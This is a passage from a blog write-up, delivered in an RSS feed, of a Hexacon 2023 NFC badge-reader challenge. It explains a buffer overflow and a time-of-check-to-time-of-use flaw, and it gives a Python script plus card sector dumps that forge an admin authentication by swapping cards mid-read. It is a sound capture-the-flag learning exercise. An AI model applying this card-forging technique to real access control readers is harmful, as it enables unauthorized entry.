<p>We can now forge tokens for any <code>username</code>, including <code>hexacon_admin</code>, which should pop up the <code>notify(ADMIN_AUTH)</code>. However, if we set <code>username</code> like this, the <code>check_token</code> function (Listing&nbsp;6) will take a different path where it compares against the <code>admin_token</code>, which we still don’t know, and also cannot reach with the <code>strcpy</code> overflow.</p>
</section>
<section id="bug-2" class="level1">
<h1>Bug 2</h1>
<p>Then we noticed the application reads a second time from the card while in the non-admin branch of <code>check_token</code>, which will refill the global <code>context</code> structure. This means the application contains a <a href="https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use">TOCTOU</a> type vulnerability where some checks are performed on one copy of the data, and then performs actions based on another copy of the data. Namely, the check on <code>username</code> to reach the right branch is performed on the first copy from the card, while the check in the <code>main</code> loop, which determines which final message we reach, is performed on the second read. So if we can switch the <code>username</code> portion of the card’s data fast enough, we can reach the right branch in <code>check_token</code> while setting the username to <code>hexacon_admin</code> and triggering the <code>notify(ADMIN_AUTH)</code>. With something like a <a href="https://github.com/Proxmark/proxmark3">Proxmark</a> or a <a href="https://docs.flipper.net/nfc/read">Flipper Zero</a> it’s probably possible to switch between card data fast enough. Alternatively, we could simply use two cards, write the different <code>username</code>s with matching <code>token</code>s, and switch them in between reads, if we are fast enough. However, our ninja skills were fast enough :(</p>
</section>
<section id="ninja-skills" class="level1">
<h1>Ninja skills</h1>
<p>Recall the <code>iterations</code> variable that we could overwrite with the overflow. This determines the amount of times the pseudorandom function (<code>HMAC</code> in this case) is applied on the potentially weak password input in the <code>PBKDF2_HMAC</code> function. Setting this value really high, rather than really low, also means more computation time is needed in the application reading the cards. Furthermore, this calculation is performed between the two card reads, so this might give us enough time to manually switch between two cards.</p>
<div class="sourceCode" id="cb2" style="background: #f1f3f5;"><pre class="sourceCode c code-with-copy"><code class="sourceCode c"><span id="cb2-1"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">int</span> main<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">int</span> argc<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">char</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span>argv<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[])</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb2-2">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">...</span></span>
<span id="cb2-3">    <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">for</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(;;)</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb2-4">        <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">...</span></span>
<span id="cb2-5">        <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">// v- first card read</span></span>
<span id="cb2-6">        read_card<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(&amp;</span>context<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span> </span>
<span id="cb2-7"></span>
<span id="cb2-8">        <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">// v- PBKDF in here</span></span>
<span id="cb2-9">        <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">if</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>derive_key<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>admin_token<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> iterations<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> key<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">==</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">0</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span> </span>
<span id="cb2-10">            <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">...</span> </span>
<span id="cb2-11">        <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span>
<span id="cb2-12">        <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">// v- second card read in here</span></span>
<span id="cb2-13">        status_t status <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> check_token<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(&amp;</span>context<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> admin_token<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> key<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span> </span>
<span id="cb2-14">        <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">...</span></span>
<span id="cb2-15">        <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">if</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>status <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">==</span> VALID_TOKEN<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb2-16">            <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">if</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(!</span>strcmp<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>context<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span>username<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> ADMIN_USERNAME<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">))</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb2-17">                notify<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>ADMIN_AUTH<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="cb2-18">            <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span> <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">else</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb2-19">                notify<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>GUEST_AUTH<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="cb2-20">            <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span>
<span id="cb2-21">        <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span>
<span id="cb2-22">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span>
<span id="cb2-23"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span></code></pre></div>
<p>We now need to set up two cards in the following way to combine both the buffer overflow and the TOCTOU bugs:</p>
<ul>
<li>One card will contain any <code>username</code> string in sector 1 that is not <code>hexacon_admin</code>. This card needs to trigger the overflow to overwrite <code>iterations</code>. By doing this, it will also overwrite <code>key[]</code>, so we need to replace the <code>token</code> in sector 2 such that it matches with the overwritten <code>key[]</code>. Due to the offsets, the last 0x10 bytes of sector 3 will end up in <code>key[]</code> which contain some special values. The function <code>read_nfc_tag</code> from <code>nfc.h</code> warns us that “<em>the NFC tag A key MUST be ”FFFFFFFFFFFF”</em>”, which refers to to the light green portion of Figure&nbsp;2. We just left all those bytes as they were, so we recalculated the <code>token</code> as shown in Listing&nbsp;7, i.e.&nbsp;<code>token = sha256(username) ^ key</code>. The first 0x10 bytes of sector 4 will be the second half of the key, we just filled this with 0xff-bytes. Then the following 4 bytes of sector 4 can be used to control the <code>iterations</code> variable to something large like <code>0xffffffff</code>.</li>
<li>The second card will contain the <code>hexacon_admin</code> string in the <code>username</code>’s sector 1. This card will need also a valid token matching the previously overwritten <code>key[]</code>, which is generated following the same <code>token = sha256(username) ^ key</code> calculation.</li>
</ul>
<p>By presenting first the guest card, and then swapping to the admin card while the <code>PBKDF2_HMAC</code> calculation is working, we should land on the <code>notify(ADMIN_AUTH)</code> page.</p>
<p>The Python script in Listing&nbsp;8 generates the data for both cards’ sectors. Listing&nbsp;9 shows the data for the relevant card sectors.</p>
<div id="lst-card-data" class="Python listing quarto-float">
<figure class="quarto-float quarto-float-lst figure">
<figcaption class="quarto-float-caption-top quarto-float-caption quarto-float-lst" id="lst-card-data-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
Listing&nbsp;8: Code to generate the card data that exploits the vulnerabilities
</figcaption>
<div aria-describedby="lst-card-data-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
<div class="sourceCode" id="lst-card-data" style="background: #f1f3f5;"><pre class="sourceCode Python code-with-copy"><code class="sourceCode python"><span id="lst-card-data-1"><span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">from</span> hashlib <span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">import</span> sha256</span>
<span id="lst-card-data-2"></span>
<span id="lst-card-data-3">key_suffix <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'FFFFFFFFFFFFFF078069FFFFFFFFFFFF'</span></span>
<span id="lst-card-data-4"></span>
<span id="lst-card-data-5"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Calculate original key, output of pbkdf with unknown password </span></span>
<span id="lst-card-data-6"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># and empty salt</span></span>
<span id="lst-card-data-7">token1 <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> sha256(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">b'hexacon_guest'</span>).digest()</span>
<span id="lst-card-data-8">token2 <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">bytes</span>.fromhex(</span>
<span id="lst-card-data-9">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'0B5F6A804DADD14B53145858F26B7DF0BA62DD2F89440E145C352BDB00C8090A'</span>)</span>
<span id="lst-card-data-10">key <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">bytes</span>(a <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">^</span> b <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">for</span> a, b <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">in</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">zip</span>(token1, token2))</span>
<span id="lst-card-data-11"></span>
<span id="lst-card-data-12"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Calculate data for first card with hexacon_guest username</span></span>
<span id="lst-card-data-13">token3 <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> sha256(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">b'hexacon_guest'</span>).digest()</span>
<span id="lst-card-data-14">key2 <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">bytes</span>.fromhex(key_suffix) <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">b'</span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">\xff</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span><span class="bn" style="color: #AD0000;
background-color: null;
font-style: inherit;">0x10</span></span>
<span id="lst-card-data-15">token4 <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">bytes</span>(a <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">^</span> b <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">for</span> a, b <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">in</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">zip</span>(token3, key2))</span>
<span id="lst-card-data-16"></span>
<span id="lst-card-data-17"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'guest card'</span>)</span>
<span id="lst-card-data-18"></span>
<span id="lst-card-data-19"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>()</span>
<span id="lst-card-data-20"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'Sector 2 token'</span>)</span>
<span id="lst-card-data-21"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>()</span>
<span id="lst-card-data-22"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(token4[:<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">16</span>].<span class="bu" style="color: null;
background-color: null;
font-style: inherit;">hex</span>().upper())</span>
<span id="lst-card-data-23"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(token4[<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">16</span>:].<span class="bu" style="color: null;
background-color: null;
font-style: inherit;">hex</span>().upper())</span>
<span id="lst-card-data-24"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'00'</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">16</span>)</span>
<span id="lst-card-data-25"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(key_suffix)</span>
<span id="lst-card-data-26"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>()</span>
<span id="lst-card-data-27"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'Sector 3 data'</span>)</span>
<span id="lst-card-data-28"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>()</span>
<span id="lst-card-data-29"></span>
<span id="lst-card-data-30"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>((<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">b'A'</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span><span class="bn" style="color: #AD0000;
background-color: null;
font-style: inherit;">0x10</span>).<span class="bu" style="color: null;
background-color: null;
font-style: inherit;">hex</span>().upper())</span>
<span id="lst-card-data-31"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>((<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">b'A'</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span><span class="bn" style="color: #AD0000;
background-color: null;
font-style: inherit;">0x10</span>).<span class="bu" style="color: null;
background-color: null;
font-style: inherit;">hex</span>().upper())</span>
<span id="lst-card-data-32"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>((<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">b'A'</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span><span class="bn" style="color: #AD0000;
background-color: null;
font-style: inherit;">0x10</span>).<span class="bu" style="color: null;
background-color: null;
font-style: inherit;">hex</span>().upper())</span>
<span id="lst-card-data-33"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(key_suffix)</span>
<span id="lst-card-data-34"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>()</span>
<span id="lst-card-data-35"></span>
<span id="lst-card-data-36"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'Sector 4 overflow'</span>)</span>
<span id="lst-card-data-37"></span>
<span id="lst-card-data-38"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'FF'</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">16</span>) <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Second half of key</span></span>
<span id="lst-card-data-39"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'FF'</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">4</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'00'</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">12</span>) <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># iterations value</span></span>
<span id="lst-card-data-40"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'00'</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">16</span>)</span>
<span id="lst-card-data-41"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(key_suffix)</span>
<span id="lst-card-data-42"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>()</span>
<span id="lst-card-data-43"></span>
<span id="lst-card-data-44"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'admin card'</span>)</span>
<span id="lst-card-data-45"></span>
<span id="lst-card-data-46">token5 <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> sha256(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">b'hexacon_admin'</span>).digest()</span>
<span id="lst-card-data-47">key2 <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">bytes</span>.fromhex(key_suffix) <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">b'</span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">\xff</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span><span class="bn" style="color: #AD0000;
background-color: null;
font-style: inherit;">0x10</span></span>
<span id="lst-card-data-48">token6 <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">bytes</span>(a <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">^</span> b <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">for</span> a, b <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">in</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">zip</span>(token5, key2))</span>
<span id="lst-card-data-49"></span>
<span id="lst-card-data-50"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>()</span>
<span id="lst-card-data-51"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'Sector 1 username'</span>)</span>
<span id="lst-card-data-52"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>()</span>
<span id="lst-card-data-53"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">b'hexacon_admin'</span>.<span class="bu" style="color: null;
background-color: null;
font-style: inherit;">hex</span>().upper() <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'00'</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">3</span>)</span>
<span id="lst-card-data-54"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'00'</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">16</span>)</span>
<span id="lst-card-data-55"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'00'</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">16</span>)</span>
<span id="lst-card-data-56"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(key_suffix)</span>
<span id="lst-card-data-57"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>()</span>
<span id="lst-card-data-58"></span>
<span id="lst-card-data-59"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'Sector 2 token'</span>)</span>
<span id="lst-card-data-60"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>()</span>
<span id="lst-card-data-61"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(token6[:<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">16</span>].<span class="bu" style="color: null;
background-color: null;
font-style: inherit;">hex</span>().upper())</span>
<span id="lst-card-data-62"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(token6[<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">16</span>:].<span class="bu" style="color: null;
background-color: null;
font-style: inherit;">hex</span>().upper())</span>
<span id="lst-card-data-63"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'00'</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">16</span>)</span>
<span id="lst-card-data-64"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(key_suffix)</span>
<span id="lst-card-data-65"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>()</span></code></pre></div>
</div>
</figure>
</div>
<div id="lst-card-data-out" class="default listing quarto-float">
<figure class="quarto-float quarto-float-lst figure">
<figcaption class="quarto-float-caption-top quarto-float-caption quarto-float-lst" id="lst-card-data-out-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
Listing&nbsp;9: Data for both cards
</figcaption>
<div aria-describedby="lst-card-data-out-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
<div class="sourceCode" id="lst-card-data-out" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="lst-card-data-out-1">guest card</span>
<span id="lst-card-data-out-2"></span>
<span id="lst-card-data-out-3">Sector 2 token</span>
<span id="lst-card-data-out-4"></span>
<span id="lst-card-data-out-5">8C4A73259238FB2FCCBCB0EFE07FAD8B</span>
<span id="lst-card-data-out-6">E58A01635AC06B30426CE53BDF49544A</span>
<span id="lst-card-data-out-7">00000000000000000000000000000000</span>
<span id="lst-card-data-out-8">FFFFFFFFFFFFFF078069FFFFFFFFFFFF</span>
<span id="lst-card-data-out-9"></span>
<span id="lst-card-data-out-10">Sector 3 data</span>
<span id="lst-card-data-out-11"></span>
<span id="lst-card-data-out-12">41414141414141414141414141414141</span>
<span id="lst-card-data-out-13">41414141414141414141414141414141</span>
<span id="lst-card-data-out-14">41414141414141414141414141414141</span>
<span id="lst-card-data-out-15">FFFFFFFFFFFFFF078069FFFFFFFFFFFF</span>
<span id="lst-card-data-out-16"></span>
<span id="lst-card-data-out-17">Sector 4 overflow</span>
<span id="lst-card-data-out-18">FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF</span>
<span id="lst-card-data-out-19">FFFFFFFF000000000000000000000000</span>
<span id="lst-card-data-out-20">00000000000000000000000000000000</span>
<span id="lst-card-data-out-21">FFFFFFFFFFFFFF078069FFFFFFFFFFFF</span>
<span id="lst-card-data-out-22"></span>
<span id="lst-card-data-out-23">admin card</span>
<span id="lst-card-data-out-24"></span>
<span id="lst-card-data-out-25">Sector 1 username</span>
<span id="lst-card-data-out-26"></span>
<span id="lst-card-data-out-27">68657861636F6E5F61646D696E000000</span>
<span id="lst-card-data-out-28">00000000000000000000000000000000</span>
<span id="lst-card-data-out-29">00000000000000000000000000000000</span>
<span id="lst-card-data-out-30">FFFFFFFFFFFFFF078069FFFFFFFFFFFF</span>
<span id="lst-card-data-out-31"></span>
<span id="lst-card-data-out-32">Sector 2 token</span>
<span id="lst-card-data-out-33"></span>
<span id="lst-card-data-out-34">49B0B706DBF13385983D75887C4F1061</span>
<span id="lst-card-data-out-35">78BB9677F34F57110D1584800037F513</span>
<span id="lst-card-data-out-36">00000000000000000000000000000000</span>
<span id="lst-card-data-out-37">FFFFFFFFFFFFFF078069FFFFFFFFFFFF</span></code></pre></div>
</div>
</figure>
</div>
</section>
<section id="success" class="level1">
<h1>Success!</h1>
<p>Even with our slow ninja skills, we now are fast enough to see the success screen!</p>
<div id="fig-flag" class="quarto-figure quarto-figure-center quarto-float anchored">
<figure class="quarto-float quarto-float-fig figure">
<div aria-describedby="fig-flag-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
<img src="https://nilswiersma.github.io/2023/hexacon23/figs/flag.webp" class="img-fluid figure-img" style="width:50.0%">
</div>
<figcaption class="quarto-float-caption-bottom quarto-float-caption quarto-float-fig" id="fig-flag-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
Figure&nbsp;3: Flag obtained!
</figcaption>
</figure>
</div>
<p>We were not fast enough to win the first prize, but we were fast enough to win the second prize, a very cool <a href="https://o.mg.lol/">o.mg.lol</a> cable! Great challenge, very creative way of triggering and using a buffer overflow!</p>
<div id="fig-prize" class="quarto-figure quarto-figure-center quarto-float anchored">
<figure class="quarto-float quarto-float-fig figure">
<div aria-describedby="fig-prize-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
<img src="https://nilswiersma.github.io/2023/hexacon23/figs/omg-cable.webp" class="img-fluid figure-img" style="width:50.0%">
</div>
<figcaption class="quarto-float-caption-bottom quarto-float-caption quarto-float-fig" id="fig-prize-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
Figure&nbsp;4: o.mg cable
</figcaption>
</figure>
</div>


</section>

 ]]></description>
  <guid>https://nilswiersma.github.io/2023/hexacon23/hexacon23.html</guid>
  <pubDate>Tue, 24 Oct 2023 22:00:00 GMT</pubDate>
  <media:content url="https://nilswiersma.github.io/2023/hexacon23/figs/flag.webp" medium="image" type="image/webp"/>
</item>
</channel>
</rss>
